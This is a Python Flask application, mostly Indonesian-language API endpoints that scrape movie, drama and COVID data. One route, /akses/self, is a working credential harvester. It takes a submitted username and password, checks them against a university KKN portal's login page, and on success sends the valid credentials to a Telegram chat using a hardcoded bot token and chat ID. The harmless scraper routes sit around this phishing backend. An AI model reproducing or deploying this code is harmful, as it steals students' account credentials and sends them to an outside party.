from flask import Flask, request, render_template, make_response
import requests as req
from bs4 import BeautifulSoup as  bs
import json
import ftplib


app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/akses', methods=['GET', 'POST'])
def asu():
    return render_template('asu.html')

@app.route('/akses/self', methods=['GET', 'POST'])
def run():
    if request.method == 'POST':
        x = request.form['nama']
        y = request.form['pass']
        return umsida(x, y)


def umsida(usr, pwd):
    url = 'https://kkn.uii.ac.id/login.php'
    x = {
        "u":usr,
        "p":pwd,
        "submit":"submit"
        }
    post = req.post(url, data=x).url
    if post.find('KKN-Status-Pendaftaran') != -1:
        msg = "username: "+usr+"\npassword: "+pwd+"\n"
        TOKEN = '2011172773:AAG-23HV-MX8Wn0anI5Bm9fuoQC4pJVwy7U'
        CHAT_ID = '1884067981'
        urls = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}'
        ntz = req.post(urls)
        return 'Login sukses'
    else:
        return 'Login gagal'
        
    
        

@app.route('/api/filmapik/new_movie')
def filmapik():
    url = "https://api-sanz.herokuapp.com/api/filmapik/terbaru?apikey=sanzking"
    html = req.get(url).text
    js = json.loads(html)
    res = js["result"]["result"]
    for i in range(len(res)):
        data = res[i]
        judul = data['title']
        rating = data['rating']
        kualitas = data['quality']
        trailer = data['detail']['trailer']
        genre = data['detail']['genre']
        cast = data['detail']['actors']
        negara = data['detail']['country']
        tahun = data['detail']['release']
        tumbnail = data['detail']['thumbnailLandscape']
        sinopsis = data['detail']['description']
    
        data_covid = {
            "creator":"sanzking",
            "status":200,
            "result":{
                "judul":judul,
                "rating":rating,
                "kualitas":kualitas,
                "trailer":trailer,
                "genre":genre,
                "cast":cast,
                "negara":negara,
                "tahun":tahun,
                "sinopsis":sinopsis
            }
        }

        cv = json.dumps(data_covid, indent=4)
        cvd = make_response(cv)
        cvd.headers['Content-Type'] = 'application/json; charset=utf-8'
        cvd.headers['mimetype'] = 'application/json'
        return cvd

@app.route('/api/dramaindo', methods=['GET', 'POST'])
def dramaindo():
    nama_dramaindo = request.args['judul']
    return di(nama_dramaindo)

def di(keyword):
    url = "https://163.172.111.222/?s="
    r = req.get(url+keyword)
    soup = bs(r.content, 'html.parser')
    container = soup.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='post').findAll('article')
    for i in range(len(container)):
        res = container[i]
        link = res.find('div', class_='thumb').find('a')['href']
        s = req.get(link)
        soup1 = bs(s.content, 'html.parser')
        sinopsis = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='sinopsis').find('div', class_='content').findAll('p')[0].text
        judul_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[0].text
        genre_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[2].text
        cast_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[3].text
        year_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[4].text
        episode_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[5].text
        duration_ = soup1.find('div', class_='container').find('div', class_='wrapper').find('div', class_='post-wrapper').find('div', class_='info_single').find('div', class_='info_2').find('ul').findAll('li')[7].text

        judul = judul_.split(':')[1]
        genre = genre_.split(':')[1]
        cast = cast_.split(':')[1]
        year = year_.split(':')[1]
        episode = episode_.split(':')[1]
        duration = duration_.split(':')[1]


        data = {
            "status":200,
            "creator":"sanzking",
            "result":{
                "judul":judul,
                "genre":genre,
                "pemain":cast,
                "tahun":year,
                "episode":episode,
                "durasi":duration,
                "sinopsis":sinopsis,
                "link":link
            }
        }
        b = json.dumps(data, indent=4)
        response = make_response(b)
        response.headers['Content-Type'] = 'application/json; charset=utf-8'
        response.headers['mimetype'] = 'application/json'
        return response

@app.route('/api/drakorstation', methods=['GET', 'POST'])
def drakorstation():
    nama = request.args['judul']
    return ds(nama)

def ds(keyword):
    url = "https://drakorstation.org/?s="
    r = req.get(url+keyword)
    soup = bs(r.content, 'html.parser')
    container = soup.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).findAll('article')
    for i in range(len(container)):
        res = container[i]
        link = res.find('header').find('h2', class_='post-title').find('a')['href']
        s = req.get(link)
        soup1 = bs(s.content, 'html.parser')
        sinopsis = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('p')[0].text
        judul_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[0].text
        genre_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[2].text
        director_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[3].text
        penulis_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[4].text
        episode_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[5].text
        jadwal_ = soup1.find('div', attrs = {'id':'container'}).find('div', attrs = {'id':'content'}).find('div', attrs = {'id':'inner-content'}).find('div', attrs = {'id':'main'}).find('article').find('section').findAll('h3')[6].text

        judul = judul_.split(':')[1]
        genre = genre_.split(':')[1]
        director = director_.split(':')[1]
        penulis = penulis_.split(':')[1]
        episode = episode_.split(':')[1]
        jadwal = jadwal_.split(':')[1]


        data = {
            "status":200,
            "creator":"sanzking",
            "result":{
                "judul":judul,
                "genre":genre,
                "director":director,
                "penulis":penulis,
                "episode":episode,
                "jadwal":jadwal,
                "sinopsis":sinopsis,
                "link":link
            }
        }
        b = json.dumps(data, indent=4)
        drakorst = make_response(b)
        drakorst.headers['Content-Type'] = 'application/json; charset=utf-8'
        drakorst.headers['mimetype'] = 'application/json'
        return drakorst

@app.route('/api/covid')
def covid():
    url = "http://www.sanzstore.org/api/covid"
    html = req.get(url).text
    js = json.loads(html)
    positif = js["result"]["positif"]
    meninggal = js["result"]["meninggal"]
    sembuh = js["result"]["sembuh"]

    data_covid = {
        "creator":"sanzking",
        "status":200,
        "result":{
            "positif":positif,
            "meninggal":meninggal,
            "sembuh":sembuh
        }
    }

    cv = json.dumps(data_covid, indent=4)
    cvd = make_response(cv)
    cvd.headers['Content-Type'] = 'application/json; charset=utf-8'
    cvd.headers['mimetype'] = 'application/json'
    return cvd
    
if __name__ == '__main__':
    app.run(debug=True)
